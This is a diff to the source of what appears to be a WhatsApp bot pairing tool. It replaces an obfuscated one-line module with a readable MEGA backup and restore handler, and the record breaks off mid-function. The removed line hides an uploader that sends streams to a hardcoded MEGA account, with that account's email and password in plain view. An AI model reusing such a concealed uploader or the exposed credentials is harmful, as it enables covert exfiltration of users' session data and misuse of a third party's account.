@@ -1,1 +1,268 @@
-function _0x4d76(){const _0x57cb56=['complete','1664460jWHLOq','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/42.0.2311.135\x20Safari/537.36\x20Edge/12.246','slkaveemd@gmail.com','error','9BHSSoe','log','486336ErpUIc','link','25SoChPh','525424ixZOgI','exports','9ICLQxs','Storage\x20is\x20ready.\x20Proceeding\x20with\x20upload.','Storage','close','ready','2056010tsDwVM','403228OAXPgR','kaweee456!@#','3076FbQoMv','136896QkvahX'];_0x4d76=function(){return _0x57cb56;};return _0x4d76();}const _0x21fd1c=_0x3088;function _0x3088(_0xb00238,_0x179008){const _0x4d76fc=_0x4d76();return _0x3088=function(_0x308892,_0x441902){_0x308892=_0x308892-0xb5;let _0x1ad4ea=_0x4d76fc[_0x308892];return _0x1ad4ea;},_0x3088(_0xb00238,_0x179008);}(function(_0x2f7758,_0x58ea84){const _0x4f689f=_0x3088,_0x4bfaee=_0x2f7758();while(!![]){try{const _0x528b3a=parseInt(_0x4f689f(0xca))/0x1*(parseInt(_0x4f689f(0xbf))/0x2)+-parseInt(_0x4f689f(0xb7))/0x3*(-parseInt(_0x4f689f(0xb5))/0x4)+-parseInt(_0x4f689f(0xc2))/0x5+parseInt(_0x4f689f(0xc0))/0x6+-parseInt(_0x4f689f(0xbd))/0x7+-parseInt(_0x4f689f(0xc8))/0x8+parseInt(_0x4f689f(0xc6))/0x9*(parseInt(_0x4f689f(0xbc))/0xa);if(_0x528b3a===_0x58ea84)break;else _0x4bfaee['push'](_0x4bfaee['shift']());}catch(_0x22e4b3){_0x4bfaee['push'](_0x4bfaee['shift']());}}}(_0x4d76,0x332ef));const mega=require('megajs'),auth={'email':_0x21fd1c(0xc4),'password':_0x21fd1c(0xbe),'userAgent':_0x21fd1c(0xc3)},upload=(_0x1bf62e,_0x13f024)=>{return new Promise((_0x23048a,_0x47ac12)=>{const _0x122270=_0x3088,_0x4b1061=new mega[(_0x122270(0xb9))](auth);_0x4b1061['on'](_0x122270(0xbb),()=>{const _0x35e3d9=_0x122270;console[_0x35e3d9(0xc7)](_0x35e3d9(0xb8));const _0x1d3d15=_0x4b1061['upload']({'name':_0x13f024,'allowUploadBuffering':!![]});_0x1d3d15['on'](_0x35e3d9(0xc1),_0x3f68b3=>{const _0x3246ee=_0x35e3d9;_0x3f68b3[_0x3246ee(0xc9)]((_0x11e472,_0x166391)=>{const _0x3ea663=_0x3246ee;_0x11e472?_0x47ac12(_0x11e472):(_0x4b1061[_0x3ea663(0xba)](),_0x23048a(_0x166391));});}),_0x1d3d15['on'](_0x35e3d9(0xc5),_0x25dcfc=>{_0x47ac12(_0x25dcfc);}),_0x1bf62e['pipe'](_0x1d3d15);}),_0x4b1061['on'](_0x122270(0xc5),_0x4fcf0e=>{_0x47ac12(_0x4fcf0e);});});};module[_0x21fd1c(0xb6)]={'upload':upload};
+/**
+ * KAVEE-MD - WhatsApp Bot Pairing System
+ * MEGA storage integration handler
+ */
+
+const { Storage } = require('megajs');
+const fs = require('fs');
+const path = require('path');
+
+/**
+ * Handle MEGA storage operations
+ * @param {Object} socket - Socket.io socket object
+ * @param {Object} data - Data for MEGA operations
+ */
+async function megaHandler(socket, data) {
+    const { operation, email, password, sessionId, filePath } = data;
+
+    try {
+        switch (operation) {
+            case 'backup':
+                await backupToMega(socket, email, password, sessionId);
+                break;
+            case 'restore':
+                await restoreFromMega(socket, email, password, sessionId);
+                break;
+            case 'upload':
+                await uploadFileToMega(socket, email, password, filePath);
+                break;
+            default:
+                throw new Error('Unknown MEGA operation');
+        }
+    } catch (error) {
+        console.error('MEGA operation error:', error);
+        socket.emit('mega-status', {
+            success: false,
+            operation,
+            message: 'MEGA operation failed',
+            error: error.message
+        });
+    }
+}
+
+/**
+ * Backup session data to MEGA
+ * @param {Object} socket - Socket.io socket object
+ * @param {String} email - MEGA account email
+ * @param {String} password - MEGA account password
+ * @param {String} sessionId - Session ID to backup
+ */
+async function backupToMega(socket, email, password, sessionId) {
+    try {
+        socket.emit('mega-status', {
+            success: true,
+            operation: 'backup',
+            message: 'Starting backup to MEGA...'
+        });
+
+        // Connect to MEGA
+        const storage = new Storage({
+            email,
+            password
+        });
+
+        await new Promise((resolve, reject) => {
+            storage.login((err) => {
+                if (err) {
+                    reject(new Error('MEGA login failed: ' + err.message));
+                    return;
+                }
+                resolve();
+            });
+        });
+
+        socket.emit('mega-status', {
+            success: true,
+            operation: 'backup',
+            message: 'Connected to MEGA, preparing backup...'
+        });
+
+        // Create backup directory if it doesn't exist
+        const rootFolder = storage.root;
+        let backupFolder = null;
+
+        for (const node of rootFolder.children) {
+            if (node.name === 'KAVEE-MD-Backups') {
+                backupFolder = node;
+                break;
+            }
+        }
+
+        if (!backupFolder) {
+            backupFolder = await new Promise((resolve, reject) => {
+                rootFolder.mkdir('KAVEE-MD-Backups', (err, folder) => {
+                    if (err) {
+                        reject(new Error('Failed to create backup folder: ' + err.message));
+                        return;
+                    }
+                    resolve(folder);
+                });
+            });
+        }
+
+        // Create session folder
+        let sessionFolder = null;
+        for (const node of backupFolder.children) {
+            if (node.name === sessionId) {
+                sessionFolder = node;
+                break;
+            }
+        }
+
+        if (!sessionFolder) {
+            sessionFolder = await new Promise((resolve, reject) => {
+                backupFolder.mkdir(sessionId, (err, folder) => {
+                    if (err) {
+                        reject(new Error('Failed to create session folder: ' + err.message));
+                        return;
+                    }
+                    resolve(folder);
+                });
+            });
+        }
+
+        // Create backup archive
+        const sessionPath = path.join(__dirname, 'sessions', sessionId);
+        const backupArchivePath = path.join(__dirname, `${sessionId}-backup.zip`);
+
+        // Create zip archive of session data
+        const archiver = require('archiver');
+        const output = fs.createWriteStream(backupArchivePath);
+        const archive = archiver('zip', {
+            zlib: { level: 9 }
+        });
+
+        await new Promise((resolve, reject) => {
+            output.on('close', resolve);
+            archive.on('error', reject);
+            archive.pipe(output);
+            archive.directory(sessionPath, false);
+            archive.finalize();
+        });
+
+        socket.emit('mega-status', {
+            success: true,
+            operation: 'backup',
+            message: 'Session data archived, uploading to MEGA...'
+        });
+
+        // Upload backup archive to MEGA
+        await new Promise((resolve, reject) => {
+            sessionFolder.upload(backupArchivePath, (err, uploadedFile) => {
+                if (err) {
+                    reject(new Error('Failed to upload backup: ' + err.message));
+                    return;
+                }
+                resolve(uploadedFile);
+            });
+        });
+
+        // Remove temporary backup archive
+        fs.unlinkSync(backupArchivePath);
+
+        socket.emit('mega-status', {
+            success: true,
+            operation: 'backup',
+            message: 'Backup to MEGA completed successfully!'
+        });
+    } catch (error) {
+        console.error('Backup to MEGA error:', error);
+        socket.emit('mega-status', {
+            success: false,
+            operation: 'backup',
+            message: 'Backup to MEGA failed',
+            error: error.message
+        });
+    }
+}
+
+/**
+ * Restore session data from MEGA
+ * @param {Object} socket - Socket.io socket object
+ * @param {String} email - MEGA account email
+ * @param {String} password - MEGA account password
+ * @param {String} sessionId - Session ID to restore
+ */
+async function restoreFromMega(socket, email, password, sessionId) {
+    try {
+        socket.emit('mega-status', {
+            success: true,
+            operation: 'restore',
+            message: 'Starting restore from MEGA...'
+        });
+
+        // Connect to MEGA
+        const storage = new Storage({
+            email,
+            password
+        });
+
+        await new Promise((resolve, reject) => {
+            storage.login((err) => {
+                if (err) {
+                    reject(new Error('MEGA login failed: ' + err.message));
+                    return;
+                }
+                resolve();
+            });
+        });
+
+        socket.emit('mega-status', {
+            success: true,
+            operation: 'restore',
+            message: 'Connected to MEGA, searching for backup...'
+        });
+
+        // Find backup directory
+        const rootFolder = storage.root;
+        let backupFolder = null;
+
+        for (const node of rootFolder.children) {
+            if (node.name === 'KAVEE-MD-Backups') {
+                backupFolder = node;
+                break;
+            }
+        }
+
+        if (!backupFolder) {
+            throw new Error('Backup folder not found in MEGA');
+        }
+
+        // Find session folder
+        let sessionFolder = null;
+        for (const node of backupFolder.children) {
+            if (node.name === sessionId) {
+                sessionFolder = node;
+                break;
+            }
+        }
+
+        if (!sessionFolder) {
+            throw new Error(`No backup found for session: ${sessionId}`);
+        }
+
+        // Find the latest backup file
+        let latestBackup = null;
+        let latestTime = 0;
+
+        for (const node of sessionFolder.children) {
+            if (node.timestamp > latestTime) {
+                latestBackup = node;
+                latestTime = node.timestamp;
+            }
+        }
+
+        if (!latestBackup) {
+            throw new Error(`No backup files found for session: ${sessionId}`);
+        }
+
+        socket.emit('mega-status', {
+            success: true,
+            operation: 'restore',
+            message: 'Backup found, downloading...'
+        });
+
+        // Download backup archive
+        const downloadPath = path.join(__dirname, `${sessionId}-restore.zip`);
+        
+        await new Promise((resolve, reject)
